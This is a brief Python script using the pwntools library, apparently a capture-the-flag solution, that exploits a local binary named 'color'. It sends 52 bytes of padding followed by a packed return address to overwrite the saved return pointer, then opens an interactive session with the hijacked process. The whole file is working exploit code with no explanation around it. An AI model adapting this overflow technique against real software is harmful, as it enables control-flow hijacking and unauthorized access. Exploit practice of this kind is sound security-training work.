from pwn import *

elf = context.binary = ELF('./color')
context.log_level = 'debug'
context.terminal = 'kitty'

p = process('./color')

payload = b'A' * 52 + p32(0x08048674)
print(payload)
p.send(payload)

p.interactive()
